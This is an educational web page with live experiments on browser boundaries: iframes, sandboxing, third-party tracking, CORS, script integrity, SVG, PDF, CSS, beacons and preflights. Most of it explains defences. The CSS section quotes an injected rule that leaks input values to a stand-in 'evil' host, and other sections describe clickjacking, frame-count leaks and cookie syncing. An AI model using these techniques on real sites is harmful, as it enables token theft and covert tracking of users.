Browser boundaries

A web page is built from pieces of other sites: another page in an <iframe>, data from fetch(), a library from a CDN, images, fonts, SVG. For each piece the browser decides what your page may show, read, run or send across the line between one origin and another. This page maps those boundaries with live experiments. It starts with iframes: can the parent tell how long the child took to load, or that it is a 404? How do the two pages talk? What can iframes do that few people know about, including tracking you? Then the alternatives: fetch() and CORS, scripts and integrity from a CDN, no-cors, XMLHttpRequest, beacons and pings, preflights, SVG, PDF and CSS.

You opened this page from a file:// path. Most experiments work, but the ones that load real pages need a web server to show HTTP status codes. Run python3 -m http.server in the repository folder and open it over http://localhost:8000/browser-boundaries/.

1A window inside a window

The iframe element is a box in the parent's layout. What is inside the box is a separate browsing context: a full window object with its own document, its own global variables, its own Array and Object, its own event loop timers and its own back-and-forward entries. The parent reaches the child through iframe.contentWindow; the child reaches the parent through window.parent and the outermost page through window.top.

<!-- the whole child page lives in an attribute -->
<iframe srcdoc="
  <h3>I am the child</h3>
  <p>My window is not your window.</p>
  <script>
    document.write('parent === window? ' +
                   (parent === window))
  </script>">
</iframe>

Whether the two windows can touch each other depends on one thing: the origin, meaning scheme + host + port. Same origin, and the parent can read and change anything in the child, and the child anything in the parent. Different origin, and a wall goes up.

2Can the parent time the load, or tell that it is a 404?

Timing: yes. Note the time when you insert the iframe and listen for its load event. load fires when the child's document and everything it pulls in (images, styles, scripts, its own iframes) have finished. The parent's Resource Timing list also gets an entry with initiatorType: "iframe", and a cooperating child can send its own detailed timings with postMessage.

404: only if the child is on your own origin. The load event fires for a 404 page, a 500 page, a browser error page, a DNS failure and a page that refuses to be framed alike. The iframe error event does not fire for any of them. For a same-origin child you can read the status from its Navigation Timing (responseStatus) or just look inside its document. For a cross-origin child the reliable way is a handshake: a page you control sends a message when it starts, and no message within a few seconds means it failed.

4Little-known capabilities

Things iframes do that surprise even people who use them every day. Most have a live demo.

1Every iframe is a separate JavaScript world

Each window has its own copy of every built-in: its own Array, Object, Promise. So an array made in the child is not instanceof Array in the parent. That is why Array.isArray() exists. Libraries also use the reverse: create a throwaway iframe to grab pristine built-ins (fetch, console.log) that the page may have monkey-patched.

A second surprise: an iframe with no src contains an about:blank document immediately, synchronously, on your origin. You can reach into it the moment it is in the DOM, before any load event.

2Moving an iframe in the DOM reloads it

Take an iframe out of the document and put it back somewhere else, and the browser throws away the child page and loads it again from scratch: video stops, form contents vanish, the child's state is gone. Chromium 133 added moveBefore(), which moves an element without that reset.

4Cross-origin windows are not fully sealed

Even across the origin wall, the parent can count how many frames the child has (contentWindow.length), get handles to them, see whether it is closed, and navigate it. Counting frames sounds harmless, but it is a known cross-site leak: a site that opens your bank in a popup can tell from the frame count whether you are logged in. 5A same-origin child runs on your thread

Same-origin frames share the parent's main thread, so a child stuck in a long script freezes the parent too: no clicks, no timers, no repaint. A cross-site child usually runs in another process (site isolation) and can't. The test sends each child "be busy for 1 second" and measures the longest gap in the parent's own 10 ms timer.

6sandbox switches off powers one by one, allow switches devices on

An empty sandbox attribute removes almost everything: no scripts, no forms, no popups, no dialogs, an opaque origin (so no cookies or storage), no navigating the top page. Each allow-… token gives one power back. allow is a separate attribute (Permissions Policy) for features: camera, microphone, geolocation, fullscreen, clipboard, payment. A cross-origin child gets none of those unless the parent lists them.

Never combine allow-scripts and allow-same-origin for content from your own origin: the child can then reach frameElement and remove its own sandbox attribute. Tick both and the report shows it.

7Links and forms can aim at a frame by name

Give an iframe a name, and any link or form with target="that-name" loads into it. Before fetch existed, sites submitted forms into hidden iframes to upload files without leaving the page. A child page can even target its siblings by name.

8Clickjacking: a frame you can't see

A hostile page loads your site in an invisible iframe and lines up one of your buttons under a tempting button of its own. The click goes to the invisible frame, logged in as you. The defence is on the framed site: send Content-Security-Policy: frame-ancestors 'none' (or the older X-Frame-Options: DENY) and the browser refuses to show it in a frame at all. That is why github.com shows an error page in section 2.

9loading="lazy"

An off-screen iframe with loading="lazy" is not fetched until the user scrolls near it. For pages full of embeds (maps, videos, social posts) this is the cheapest speed-up there is, and it also means the third party does not learn about the visit until the embed comes into view.

10srcdoc inherits your origin, data: does not

srcdoc and about:blank children are same-origin with the parent; a data: URL child gets a fresh opaque origin. blob: URLs keep the origin of the page that made them. This page builds all its children with srcdoc.

11postMessage(msg, '/')

A target origin of '/' means "only if the receiver is my own origin". If the frame has navigated somewhere else, the browser silently drops the message. Try it with the sandboxed child in section 3: nothing arrives.

12Print only the frame

iframe.contentWindow.print() prints the child page alone, with its own print stylesheet. Receipts and labels are often printed this way from a hidden iframe.

13Off-screen frames are throttled, and know it

Browsers slow or pause timers and requestAnimationFrame in cross-origin frames that are scrolled out of view or hidden. A child can watch its own visibility with an IntersectionObserver, which is how ads prove they were "viewable".

14credentialless and csp

Chromium-only attributes. credentialless loads the child with no cookies and a throwaway storage, so it can't recognise the user. csp="…" asks the child to adopt a Content Security Policy, and it loads only if it agrees. This browser: .

15referrerpolicy

By default the child's server learns your page's origin (not the full URL) through the Referer header. referrerpolicy="no-referrer" sends nothing. Chromium and Safari also give the child location.ancestorOrigins, a list of every origin it is nested in.

16document.domain, the old escape hatch

a.example.com and b.example.com could both set document.domain = 'example.com' and become same-origin. It is deprecated and now off by default in Chromium (a page must opt in with Origin-Agent-Cluster: ?0).

5Yes, iframes are used for tracking

An iframe from a third party is a full page of that third party, loaded every time you visit a site that embeds it: an ad, a "like" button, a comment box, a video, a chat widget, an analytics or consent frame. Each load is a request to the third party's server carrying three things that make tracking possible:

  1. Its own cookie, the same one on every site that embeds it, as long as third-party cookies are allowed. Same cookie on two sites = same person.
  2. Where you are: the Referer header (by default only the origin since 2020, but many embeds are handed the full page URL in their query string anyway).
  3. A running script that can read screen size, language, time zone, fonts and graphics quirks (fingerprinting), watch whether it is on screen, and see clicks and mouse movement inside its own box.

Iframes also do cookie syncing: an invisible frame from ad network A redirects through networks B, C and D, each of which reads its own cookie and records "A's user 7f3a is our user 91c2". That is how separate trackers merge their profiles of you.

The three sites below each embed a frame from tracker.example. Visit them in any order and watch what the tracker's database ends up knowing. This part is a simulation (no real third party is contacted); the rules are the ones browsers apply.

What browsers do about it

Safari blocks third-party cookies outright (since 2020). Firefox partitions them by top-level site (Total Cookie Protection, default since 2022). Brave blocks and partitions. Chrome has partitioned third-party localStorage, IndexedDB and the like since 2023, but still sends unpartitioned third-party cookies by default; it dropped its plan to phase them out. Sites can opt a cookie into partitioning with the Partitioned attribute (CHIPS), and an embed can ask for its real cookies back with document.requestStorageAccess().

What partitioning does not fix

Fingerprinting (no storage needed), sites handing the tracker an identifier they already know (your login email, hashed: the second checkbox above), bounce tracking through redirects, and the fact that the tracker still learns each page you visit even if it can't join them up.

6Alternatives: fetch(), CDN scripts and friends

An iframe shows another page; it does not hand it to you. To get another site's content as data, use fetch(), or XMLHttpRequest, or a library such as Axios that wraps them. The browser lets your script read the answer only when that server says so with CORS headers (Access-Control-Allow-Origin). No library, flag or mode: 'no-cors' gets around that.

Tags are different. <script src>, <img> and <link> load from any site without asking, which is why loading a library from a CDN just works. But they use what they load rather than letting you read it, and a script you load runs with all of your page's powers: the opposite of an iframe's isolation.

Why CORS exists: your browser carries your cookies and sits inside your network. If any page could fetch your webmail or your router's admin page and read the answer, every site you visit could. CORS protects the user's logged-in data, not the server: curl, Node.js and Python ignore it completely, because they carry nobody's cookies.

A careful fetch()

async function getText(url) {
  let res;
  try { res = await fetch(url); }
  catch (e) {
    // no answer, or no CORS: you can't tell which
    return null;
  }
  // a 404 or 500 does not throw
  if (!res.ok)
    throw new Error('HTTP ' + res.status);
  return res.text();
}

Classic <script src>

Needs no CORS: the browser runs whatever comes back. Add integrity (Subresource Integrity) and the browser refuses a file whose hash differs, so a hacked CDN can't swap the code. It checks that one file only; see what it covers.

<script src="https://cdn.jsdelivr.net/npm/
  dayjs@1.11.13/dayjs.min.js"
  integrity="sha384-DpVxUeeB…"
  crossorigin="anonymous"></script>

ES modules: import()

Module scripts do need CORS. CDNs like jsDelivr, unpkg and esm.sh send Access-Control-Allow-Origin: *, so this works; the same import from a site without the header fails.

const { default: dayjs } = await import(
  'https://cdn.jsdelivr.net/npm/dayjs@1.11.13/+esm');

JSONP, the pre-CORS trick

The server wraps its JSON in a call to a function you name, and you load it as a script. It needs no CORS, but only GET works, and you run whatever code the server sends. GitHub's API still supports it.

window.gotUser = (r) => console.log(r.data);
s.src = 'https://api.github.com/users/octocat'
      + '?callback=gotUser';

Script errors are hidden from you

A cross-origin classic script that throws shows only "Script error." to window.onerror, so you can't read another site's code through its error messages. With crossorigin="anonymous" and CORS from the CDN you get the real message. The file here is a Node.js module that fails in a browser.

Images: show yes, read no

An <img> from any site displays. Draw it on a canvas and the canvas becomes tainted: reading its pixels throws. With crossOrigin = 'anonymous' and CORS from the server, the pixels are yours.

A proxy on your own server

When the other site sends no CORS headers, fetch it from your backend instead: no browser, no CORS. Restrict which hosts it may reach, or anyone can use it to scan your internal network (server-side request forgery).

// Node.js (Express)
const ALLOWED = new Set(['example.com']);
app.get('/proxy', async (req, res) => {
  const u = new URL(req.query.url);
  if (!ALLOWED.has(u.hostname))
    return res.sendStatus(403);
  const r = await fetch(u);
  res.status(r.status)
     .type(r.headers.get('content-type'))
     .send(await r.text());
});

A closer look

Classic <script src>: no CORS, so can I load JavaScript from any website?

Mostly yes, and that is exactly the danger. The browser fetches the file without asking the other site and runs it as part of your page. CORS does not apply because your script never reads the file; it only runs it. The limits:

  • It must be JavaScript, served as JavaScript. A file sent as text/plain or text/html with X-Content-Type-Options: nosniff is refused. That is why raw.githubusercontent.com can't be used as a CDN, and why CDNs such as jsDelivr exist.
  • You get its effects, not its text. You can't read the source code, and a JSON API or an HTML page loaded as a script gives you nothing. JSONP works only because the server deliberately wraps its data in a function call.
  • The other server can refuse. Cross-Origin-Resource-Policy: same-site tells the browser not to hand the file to other sites. Some sites check the Referer header to stop hotlinking.
  • Your own page can refuse. A Content Security Policy such as script-src 'self' cdn.jsdelivr.net blocks scripts from every other host, even ones injected by an attacker.
  • It runs with all of your page's powers. It can read the page, form fields as they are typed, localStorage and cookies not marked HttpOnly, and send them anywhere. Whoever controls that file controls your page, today and every time it changes. In 2024 the polyfill.io domain changed owner, and the script that over 100 000 sites loaded from it started sending some of their visitors to scam sites.
  • The other site sees your visitors. Every page view requests the file, with the user's IP address and your origin in Referer. That is how third-party analytics scripts work.

So: load scripts only from sources you trust, pin an exact version, add integrity (and know what it covers), or copy the file to your own server.

What integrity covers, and what happens when a dependency changes

Exactly one file. The browser hashes the bytes of the one response the tag asked for and compares them with the attribute. Anything that script loads afterwards (its imports, import(), scripts it adds, fetch(), workers, wasm, CSS, fonts) is not checked, unless it carries a hash of its own.

  • Dependencies bundled into the file are covered. dayjs.min.js and most "browser" or UMD builds contain all the code they need. A published npm version never changes, so dayjs@1.11.13 stays the same bytes however its dependencies move on, and the hash keeps matching.
  • Dependencies loaded at run time are not. ES module builds often import each package as a separate file. jsDelivr's react-dom@18.3.1/+esm starts with import … from "/npm/react@18.3.1/+esm" and "/npm/scheduler@0.23.2/+esm": a hash on react-dom says nothing about those two.
  • When the hashed file changes, it fails safe. The browser refuses to run it: the page loses the library, but nobody can slip code in. That happens with an unpinned URL (dayjs@1, dayjs) after a new release, and with files the CDN generates, such as +esm bundles and auto-minified files, which can be rebuilt with a newer bundler. jsDelivr writes "Do NOT use SRI with dynamically generated files!" at the top of them. A file the package itself ships (/dist/…min.js) is the safe kind to hash.
  • Cross-origin integrity needs CORS. To hash a file the browser must be allowed to read it, so the tag needs crossorigin="anonymous" and the CDN must send Access-Control-Allow-Origin.
  • A whole module tree can be covered with the integrity section of an import map, which gives a hash for every module URL, however it is reached. <link rel="modulepreload" integrity="…"> does the same one module at a time.
<script type="importmap">
{ "integrity": {
  "https://cdn.jsdelivr.net/npm/react-dom@18.3.1/+esm":
    "sha384-…",
  "https://cdn.jsdelivr.net/npm/react@18.3.1/+esm":
    "sha384-…",
  "https://cdn.jsdelivr.net/npm/scheduler@0.23.2/+esm":
    "sha384-…" } }
</script>

In practice: one bundled, version-pinned file with integrity; or bundle the code yourself and serve it from your own site; or let your build tool write an import map with hashes for every module.

SVG that pulls in fonts and images from another server

It depends on how the SVG gets into the page. The same small SVG file is shown below in three ways. It contains an @import of a Google font, an <image> from httpbin.org and a <script> that turns the background green.

  • SVG as an image is sealed. In <img>, a CSS background-image or a favicon, it loads nothing from any server, not even your own, apart from data: URLs inside it, and runs no script. An image must not be able to track its viewers or run code. That is why a logo with a web font shows the wrong font as an <img>: turn the text into paths, or embed the font as a data: URL.
  • SVG as a document is an iframe. In <object>, <embed> or <iframe>, or opened on its own, it loads everything and runs its scripts. From another site, it runs as that site, behind the same wall.
  • Inline <svg> is part of your page. Its <image> follows the <img> rules, its fonts need CORS like any web font, your Content Security Policy (img-src, font-src) applies, and scripts added with innerHTML don't run. Its <style> is not scoped: it styles your whole page.
  • <use> is same-origin only. An icon sprite on a CDN is refused even though the CDN sends CORS headers. Copy the sprite to your own site, or inline the symbols.
  • Uploaded SVGs are a classic security hole. Opened directly from your domain, the script inside runs as your site, with its cookies. Serve uploads from a separate domain, send Content-Security-Policy: script-src 'none' with them, or only ever show them through <img>.
  • No integrity here. Fonts, images and <use> files have no hash attribute. A swapped image or font can't run code in your page, though; a swapped SVG in <object> can only act inside its own frame.

PDF: not HTML, but scripts, forms and actions of its own

A PDF can't contain a web page that the browser runs. It has its own world instead: JavaScript (Adobe's Acrobat scripting), form fields, links, embedded files, and actions such as "submit this form to a URL" or "open this URL". The PDF below is built by this page. It has one form field and a script that writes into it which viewer ran it and whether it can see window or fetch.

  • Firefox turns every PDF into HTML. Its viewer, pdf.js, is a PDF reader written in JavaScript: pages are drawn on canvases, the text is a layer of HTML elements, and form fields become real <input>s. It runs at Firefox's internal resource://pdf.js address, not at the address the PDF came from. The PDF's own script runs in a separate sandbox (QuickJS compiled to WebAssembly) with an Acrobat-like API, no page and no network: in a test, submitForm() and app.launchURL() to a local server never arrived.
  • Chrome's viewer (PDFium) runs in a separate process and supports fewer scripts; in the Chromium build this page was tested in, none ran. A same-origin parent can open the frame's contentDocument, but finds only an empty wrapper page (in Firefox it is null). Chromium does not show a PDF in a sandboxed iframe at all; Firefox does.
  • So in a browser a PDF's script never gets your page's origin or cookies. Desktop readers such as Acrobat are another matter: a much larger script API, launch actions, embedded files and connections home after a prompt. That is where the history of PDF malware lives.
  • The real browser risk is a file that is two things. PDF readers skip junk before the %PDF header, so one file can be a valid PDF and a valid HTML page at once (a polyglot). If your site serves an uploaded ".pdf" as text/html, or lets the browser guess the type, the HTML part runs as your site. Defences: the right Content-Type, X-Content-Type-Options: nosniff, Content-Disposition: attachment, a separate domain for uploads. The last two tiles show one file both ways.
  • pdf.js inside your own page runs as you. Sites that show PDFs with the pdfjs-dist library run it in their own origin, so a pdf.js bug is a hole in your site. In 2024 (CVE-2024-4367) a crafted font made pdf.js run arbitrary JavaScript on every site using a vulnerable version; fixed in pdf.js 4.2.67 and Firefox 126, and isEvalSupported: false closes that path.
  • Links in PDFs are a favourite phishing route, because people trust a document more than a web page. History: around 2007 Adobe Reader's browser plugin ran JavaScript put after the # of any PDF link, inside the site hosting the PDF. Plugins are gone.

CSS that imports from another server

CSS can't run scripts, but it can pull in other stylesheets with @import and images and fonts with url(), and those requests can leak what is on your page.

  • Using a stylesheet versus reading it. A cross-site stylesheet applies without asking anyone. Reading its rules from script (sheet.cssRules) needs CORS: crossorigin="anonymous" plus the server's header. The same rule as for images and scripts.
  • @import and url() load without CORS, like an <img>: shown, not readable. Fonts are the exception and always need CORS. A relative url() is resolved against the stylesheet's own address, not your page's.
  • integrity covers the <link> file only. @import has no hash attribute, and neither do fonts or images in url().
  • The type is enforced. A cross-site stylesheet must be served as text/css, or it is ignored.
  • Injected CSS can read your page. If an attacker can add CSS (user themes, or HTML that was filtered for scripts but not styles), rules like input[value^="4"] { background: url(https://evil/?4) } report the value one character at a time; this has been used to steal hidden security tokens. It sees only the value attribute, which follows typing only on pages that copy keystrokes into it, as many React pages do.
  • Fonts split by character (unicode-range) reveal which characters appear, because only the needed files are fetched.
  • Defences: a Content Security Policy style-src limits where styles may come from; img-src and font-src limit where leaks can go.
  • Email: a remote image in a mail, from CSS or <img>, tells the sender you opened it; Gmail fetches images through its own proxy for that reason. History: old Internet Explorer ran script from CSS with expression(), old Firefox with -moz-binding; and :visited may now change only colours that scripts can't read, after it was used to sniff browsing history.

fetch(url, { mode: 'no-cors' }): a request you may not look at

no-cors does not switch CORS off. It tells the browser: "I know I'm not allowed to read the answer; send the request anyway and give me a sealed envelope." You get an opaque response: type: "opaque", status: 0, ok: false, no headers and an empty body. A 200, a 404 and a 500 look identical.

  • Only GET, HEAD and POST. Any other method throws.
  • Only "simple" headers. Others, such as Authorization, are silently dropped, and a Content-Type must be text/plain, a form encoding or multipart, so a JSON POST is not possible.
  • Network failures still throw. A missing domain or a refused connection rejects the promise as usual, so you do learn whether a server answered at all.
  • Cookies: like any fetch, the other site's cookies are sent only with credentials: 'include', and then only if third-party cookies are allowed.

What it is for: fire-and-forget requests (a ping, a form post) to a server that will never send CORS headers, and service workers that cache.put() files from a CDN and later hand them to an <img> or <script>, which may use them. Chrome counts each cached opaque response as about 7 MB of storage quota, because its real size must stay secret.

The common mistake: a CORS error appears, someone adds mode: 'no-cors', the error goes away, and then await res.json() throws a SyntaxError ("Unexpected end of input") because the body is empty. The real fix is CORS headers on the other server, or a proxy.

navigator.sendBeacon(): send and forget, even as the page closes

navigator.sendBeacon(url, data) queues a small POST request and returns at once: true if the browser accepted it, false if not, usually because the data is too big. The browser delivers it in the background, even if the user closes the tab or goes to another page, when an ordinary request would be cancelled.

  • Always a POST. The data can be a string (sent as text/plain), a Blob, FormData or URLSearchParams.
  • No reply. There is no promise and no response; you never learn whether the server got it.
  • Small. All beacons and keepalive fetches still in flight from a page may total about 64 KB.
  • No CORS check for a string, FormData or URLSearchParams, like no-cors. A Blob typed application/json makes it a real CORS request with a preflight. The target site's cookies go along, where third-party cookies are allowed.
  • When to send: on visibilitychange to hidden. The unload event often never fires on phones, and it stops the page from being kept in the back/forward cache.
  • The modern twin: fetch(url, { method: 'POST', body, keepalive: true }) also outlives the page, and lets you set headers and read the reply if the page is still there.

Used for analytics, "time on page", error reports and performance measurements from real users. It is also how trackers report your last moments on a page; <a ping="url"> does the same for link clicks.

document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden')
    navigator.sendBeacon('/log', JSON.stringify(stats));
});

XMLHttpRequest Level 2: the fetch() before fetch()

XHR is older than its name suggests and still has one thing fetch() lacks. Microsoft added it to Internet Explorer 5 in 1999 for Outlook's web mail; other browsers copied it, and it started the "Ajax" era. Level 2 (W3C drafts, 2008 to 2012) added what made it modern: cross-origin requests with CORS, progress events, FormData, binary responseTypes (arraybuffer, blob, json), timeout and withCredentials. The levels were then merged into one WHATWG XMLHttpRequest Living Standard, so "Level 2" is just XHR today.

  • Upload progress. xhr.upload.onprogress reports bytes sent. fetch() can report download progress by reading the body stream, but has no upload progress (Chromium can stream a request body with duplex: 'half', a workaround, not an event).
  • A listener changes the request. Adding any xhr.upload listener to a cross-origin request forces a CORS preflight, because the progress events would tell the page how fast the other server reads. The same request without a listener goes straight out.
  • The same CORS rules as fetch(). Blocked responses give status: 0 and an error event with no reason. withCredentials = true is credentials: 'include'.
  • Synchronous mode still exists. open(method, url, false) freezes the page until the answer arrives; it is deprecated on the main thread, logs a warning, and may not set responseType or timeout.
  • timeout is built in; with fetch() you write signal: AbortSignal.timeout(ms).

<a ping>: a link click that sends a POST

Yes, it is as odd as it sounds. <a href="…" ping="https://tracker.example/click"> follows the link as usual and, in the background, sends a POST to every URL listed in ping. The body is the four letters PING, typed text/ping, and two headers say where the click came from and went to. So a plain link, which normally makes only a GET, makes a POST too.

  • Why it exists: sites already track clicks by sending links through a redirect (/url?q=…) or by catching the click in JavaScript. ping makes that visible in the markup, keeps the real URL in href, and does not slow the navigation down.
  • No CORS, no reply: it is sent in no-cors mode like a beacon, with the ping server's cookies where third-party cookies are allowed.
  • Ping-From (the page) is left out when the page is HTTPS and the ping goes to another origin; Ping-To (the link target) is always sent.
  • Browsers disagree. Chromium and Safari send pings, with no setting to turn them off; Firefox ignores the attribute unless browser.send_pings is turned on in about:config. In a test, headless Firefox sent nothing.

Preflight: the browser asks before it sends

A preflight is a question the browser asks a server, on your page's behalf, before sending a request that server might not expect. Your script calls fetch() once. The browser holds that request back, first sends a short OPTIONS request that only describes it ("from this origin, may I send a PUT with an X-PINGOTHER header?"), and sends the real request only if the answer says yes. Your script never sees the preflight: it gets either the real response or a TypeError.

  1. 0your script
    fetch('https://api.example/items', { method: 'PUT', headers: { 'X-PINGOTHER': 'pingpong' }, body })
    One call, one request as far as the script knows.
  2. The preflight: the browser does this by itself, and your script can neither see nor change it
    1. 1 →browser to server
      OPTIONS /itemsOrigin: https://you.example
      Access-Control-Request-Method: PUT
      Access-Control-Request-Headers: x-pingother
      "May a page from you.example send this?" No body, no cookies.
    2. 2 ←server to browser
      204 No ContentAccess-Control-Allow-Origin: https://you.example
      Access-Control-Allow-Methods: GET, PUT
      Access-Control-Allow-Headers: x-pingother
      Access-Control-Max-Age: 3600
      "Yes, and you need not ask again for an hour." Anything else means no: step 3 is never sent and fetch() rejects with TypeError: Failed to fetch.
  3. 3 →browser to server
    PUT /itemsOrigin: https://you.example
    X-PINGOTHER: pingpong
    (the body)
    The request your script asked for.
  4. 4 ←server to browser
    200 OKAccess-Control-Allow-Origin: https://you.example
    The usual CORS check on the response: only now may the script read it.

Why ask first?

Before CORS, a page could make the browser send another site only what an HTML form or an <img> could: a GET or a POST with a form-style body. Servers were built on that: "a DELETE, or a request with a custom header, can only come from our own app". Letting any page fire a DELETE with custom headers at your bank would have broken them overnight. So for anything a form couldn't send, the browser asks first, and an old server that has never heard of CORS answers without the Access-Control-Allow-* headers, which counts as no. The preflight protects servers from requests; the check in step 4 protects the user's data from your page.

When is there a preflight?

Only for cross-origin fetch() and XHR that are not "simple". Simple means GET, HEAD or POST, with no headers beyond Accept, Accept-Language, Content-Language, Range and a Content-Type of text/plain, application/x-www-form-urlencoded or multipart/form-data, exactly what a form can send. Everything else is preflighted: PUT, DELETE, PATCH, a JSON body (application/json), an Authorization header, any custom header, an XHR with an upload listener, and an OPTIONS request of your own. Same-origin requests never are.

Where X-PINGOTHER fits: it does not use OPTIONS itself. In MDN's example the script sends an ordinary POST with a made-up header, X-PINGOTHER: pingpong (and an XML body). The name means nothing; it was picked because no browser counts it as safe. That one header is what makes the browser send an OPTIONS preflight first. The real POST carries X-PINGOTHER; the preflight only names it, in Access-Control-Request-Headers.

  • The preflight carries no body and no cookies, only Access-Control-Request-Method and Access-Control-Request-Headers (lower-cased, sorted). The server answers with the methods and headers it allows.
  • Access-Control-Max-Age lets the browser remember the answer per URL. Without it, about 5 seconds; Chromium caps it at 2 hours, Firefox at 24.
  • OPTIONS is older than CORS: an HTTP method for "what can I do here?". A plain OPTIONS request is answered with an Allow: GET, POST, … header, and OPTIONS * asks about the whole server.
  • Your own script can send OPTIONS with fetch(url, { method: 'OPTIONS' }) or xhr.open('OPTIONS', url). To another site that is itself a non-simple request, so the browser first sends a preflight OPTIONS asking whether it may send yours: two OPTIONS in a row (recorded below). The server must allow OPTIONS in Access-Control-Allow-Methods, and its Allow header is readable only if it is listed in Access-Control-Expose-Headers.
  • A script can't forge a preflight. Origin and Access-Control-Request-* are forbidden request headers: setting them throws no error, the browser just sends its own. no-cors mode allows only GET, HEAD and POST, TRACE is refused outright, and OPTIONS * can't be written as a URL at all; HTML forms, sendBeacon and <a ping> can't send OPTIONS either. Outside the browser (curl -X OPTIONS, Node.js, Python) none of this applies.

"It works in curl but not in the browser"

The usual reason is the preflight. curl sends only the real request; the browser sends an OPTIONS first, and the server mishandles it:

  • No route for OPTIONS. The server answers 404 or 405, which counts as no, so every PUT, DELETE and JSON POST fails with TypeError: Failed to fetch. CORS middleware (for example the cors package in Express) answers OPTIONS for you.
  • Login checks run on OPTIONS. The preflight carries no cookies and no Authorization header, so an auth layer replies 401 and the real request is never sent. Answer preflights before checking who is calling.
  • A header is missing from Access-Control-Allow-Headers, typically Authorization or Content-Type once the body is JSON.
  • Access-Control-Allow-Origin: * with credentials. With credentials: 'include' the server must name the origin exactly and send Access-Control-Allow-Credentials: true.
  • A cache shares one origin's answer with another. A server that echoes the caller's origin must also send Vary: Origin.

The console names the exact reason, e.g. "Response to preflight request doesn't pass access control check: …"; the script only ever sees TypeError.

7Using iframes well

  • Embedding someone else: sandbox with only the tokens it needs, an explicit allow list, loading="lazy", referrerpolicy="strict-origin-when-cross-origin" or stricter, and a title for screen readers. For heavy or tracking embeds, show a static placeholder and load the real iframe on click (the "facade" pattern; YouTube also offers youtube-nocookie.com).
  • Being embedded: decide who may frame you with Content-Security-Policy: frame-ancestors; 'none' if nobody. Cookies with SameSite=Lax (the default) are not sent to your site when it is framed by another site.
  • Talking: always give postMessage a target origin, always check event.origin and event.source, and treat event.data as untrusted input.
  • Loading: use a handshake message to know the child really works; don't trust load alone.
